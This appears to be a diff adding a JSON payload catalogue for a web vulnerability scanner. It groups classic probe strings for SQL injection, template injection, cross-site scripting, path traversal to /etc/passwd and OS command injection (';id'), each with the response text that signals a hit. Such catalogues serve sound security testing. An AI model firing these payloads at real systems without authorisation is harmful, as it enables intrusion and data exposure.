@@ -1,0 +1,44 @@
+{
+  "families": [
+    {
+      "family": "sqli",
+      "label": "SQL injection",
+      "payloads": [
+        {"value": "' OR 1=1--", "result_features": []},
+        {"value": "' UNION SELECT", "result_features": []}
+      ]
+    },
+    {
+      "family": "ssti",
+      "label": "Server-side template injection",
+      "payloads": [
+        {"value": "{{7*7}}", "result_features": ["49"]},
+        {"value": "${7*7}", "result_features": ["49"]}
+      ]
+    },
+    {
+      "family": "xss",
+      "label": "Cross-site scripting",
+      "payloads": [
+        {"value": "<script>alert(1)</script>", "result_features": []},
+        {"value": "\"><img src=x onerror=alert(1)>", "result_features": []}
+      ]
+    },
+    {
+      "family": "path_traversal",
+      "label": "Path traversal",
+      "payloads": [
+        {"value": "../../../etc/passwd", "result_features": ["root:x:"]},
+        {"value": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "result_features": ["root:x:"]}
+      ]
+    },
+    {
+      "family": "command_injection",
+      "label": "OS command injection",
+      "payloads": [
+        {"value": ";id", "result_features": ["uid="]},
+        {"value": "|id", "result_features": ["uid="]}
+      ]
+    }
+  ]
+}
